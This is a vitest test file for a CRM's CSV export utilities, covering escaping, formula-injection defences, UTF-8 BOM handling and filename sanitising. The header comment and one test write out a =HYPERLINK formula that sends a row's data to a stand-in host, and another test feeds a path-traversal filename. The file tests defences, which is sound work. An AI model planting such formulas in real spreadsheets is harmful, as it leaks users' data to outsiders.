/**
 * CSV output safety.
 *
 * An export is a file that leaves the CRM and gets opened in Excel or Sheets by
 * somebody who did not make it. Two things can go wrong there, and neither
 * raises an error:
 *
 *  - Bad escaping shifts every column after a comma, so a quiet data corruption
 *    reads as a real report.
 *  - A cell beginning `=` is evaluated as a formula rather than shown as text.
 *    `=HYPERLINK("http://x/?"&A1,"Click")` typed into a company name becomes a
 *    live link that exfiltrates the row. Quoting does not prevent it — the
 *    spreadsheet strips the quotes and still evaluates what is inside — so the
 *    cell's content has to change.
 *
 * Both are tested here because both are silent in production.
 */

import { describe, expect, it } from 'vitest';
import { csvCell, csvDocument, csvFilename, csvRow } from '@rs/shared';

describe('escaping one cell', () => {
  it('leaves an ordinary value alone', () => {
    expect(csvCell('Ravi Kumar')).toBe('Ravi Kumar');
  });

  it('quotes a value containing a comma', () => {
    // Without this every column after it shifts left by one.
    expect(csvCell('Kumar, Ravi')).toBe('"Kumar, Ravi"');
  });

  it('doubles interior quotes and wraps the cell', () => {
    expect(csvCell('Ravi "Raj" Kumar')).toBe('"Ravi ""Raj"" Kumar"');
  });

  it('quotes newlines and carriage returns', () => {
    expect(csvCell('Line one\nLine two')).toBe('"Line one\nLine two"');
    expect(csvCell('Line one\r\nLine two')).toBe('"Line one\r\nLine two"');
  });

  it('quotes a value with leading or trailing spaces', () => {
    // Some readers trim unquoted cells, and a trimmed value is a changed value.
    expect(csvCell('  padded  ')).toBe('"  padded  "');
  });

  it('renders null and undefined as empty, not as the words', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('renders a number without quoting it', () => {
    expect(csvCell(0)).toBe('0');
    expect(csvCell(1234)).toBe('1234');
  });

  it('keeps an empty string empty', () => {
    expect(csvCell('')).toBe('');
  });
});

describe('formula injection', () => {
  it('neutralises every dangerous prefix', () => {
    /*
      All five that Excel and Sheets evaluate. The prefix is a single quote,
      which both read as "the rest is text", and the original characters are
      kept so the value stays legible.
    */
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('+1')).toBe("'+1");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    /*
      A leading tab is prefixed but not quoted: the prefixed value contains no
      quote, comma or newline, and a tab is not trailing whitespace for the
      trim check. Prefixing is what defuses it; quoting was never the defence.
    */
    expect(csvCell('\tTabbed')).toBe("'\tTabbed");
    // A leading CR is prefixed AND quoted, because \r is in the quote set.
    expect(csvCell('\rReturn')).toBe('"\'\rReturn"');
  });

  it('neutralises the exfiltration payload specifically', () => {
    const attack = '=HYPERLINK("http://evil/?"&A1,"Click")';
    const result = csvCell(attack);
    // Prefixed, so it is never evaluated...
    expect(result.startsWith('"\'=') || result.startsWith("'=")).toBe(true);
    // ...and still quoted, because it contains commas and quotes.
    expect(result.startsWith('"')).toBe(true);
  });

  it('neutralises a negative number too, and that is the right trade', () => {
    /*
      `-5` starts with a formula character, so it is prefixed. A cell reading
      -5 as text is a cosmetic cost; an un-neutralised `-` is an evaluated cell.
      Every money figure this CRM exports is non-negative, so the cost does not
      arise in practice.
    */
    expect(csvCell('-5')).toBe("'-5");
  });

  it('does not touch a formula character that is not leading', () => {
    // "A=B" is not a formula, and mangling it would be a false positive.
    expect(csvCell('A=B')).toBe('A=B');
    expect(csvCell('sales+marketing@example.com')).toBe('sales+marketing@example.com');
  });
});

describe('unicode', () => {
  it('passes Devanagari through unchanged', () => {
    expect(csvCell('रवि कुमार')).toBe('रवि कुमार');
  });

  it('passes the rupee sign through unchanged', () => {
    expect(csvCell('₹1,200.00')).toBe('"₹1,200.00"');
  });

  it('prepends a BOM so Excel on Windows reads UTF-8 correctly', () => {
    /*
      Without the BOM, Excel reads a UTF-8 file as the system code page and a
      Devanagari name arrives as mojibake. It is the only thing that fixes that,
      and every other reader tolerates it.
    */
    const doc = csvDocument(['Name'], [['रवि']]);
    expect(doc.startsWith('﻿')).toBe(true);
  });

  it('can omit the BOM when a caller does not want it', () => {
    expect(csvDocument(['Name'], [['x']], { bom: false }).startsWith('﻿')).toBe(false);
  });
});

describe('rows and documents', () => {
  it('joins a row with commas', () => {
    expect(csvRow(['a', 'b', 'c'])).toBe('a,b,c');
  });

  it('separates lines with CRLF, as RFC 4180 specifies', () => {
    const doc = csvDocument(['A', 'B'], [['1', '2']], { bom: false });
    expect(doc).toBe('A,B\r\n1,2\r\n');
  });

  it('writes a header-only document when there are no rows', () => {
    // An empty result is a file with a header, not an empty file: the reader
    // can see the export ran and matched nothing.
    expect(csvDocument(['A'], [], { bom: false })).toBe('A\r\n');
  });

  it('keeps column counts aligned when a cell is empty', () => {
    const doc = csvDocument(['A', 'B', 'C'], [['1', null, '3']], { bom: false });
    expect(doc).toBe('A,B,C\r\n1,,3\r\n');
  });
});

describe('the download filename', () => {
  it('carries the date so two exports do not collide', () => {
    const name = csvFilename('rs-customers', new Date('2026-10-23T12:00:00.000Z'));
    expect(name).toBe('rs-customers-2026-10-23.csv');
  });

  it('strips characters that would break the Content-Disposition header', () => {
    // A quote ends the header's quoted string early; a slash makes it a path.
    const name = csvFilename('rs "customers"/../etc', new Date('2026-10-23T00:00:00.000Z'));
    expect(name).not.toContain('"');
    expect(name).not.toContain('/');
    expect(name).not.toContain('..');
    expect(name.endsWith('.csv')).toBe(true);
  });

  it('falls back to a usable name when the base reduces to nothing', () => {
    const name = csvFilename('///', new Date('2026-10-23T00:00:00.000Z'));
    expect(name).toBe('export-2026-10-23.csv');
  });
});
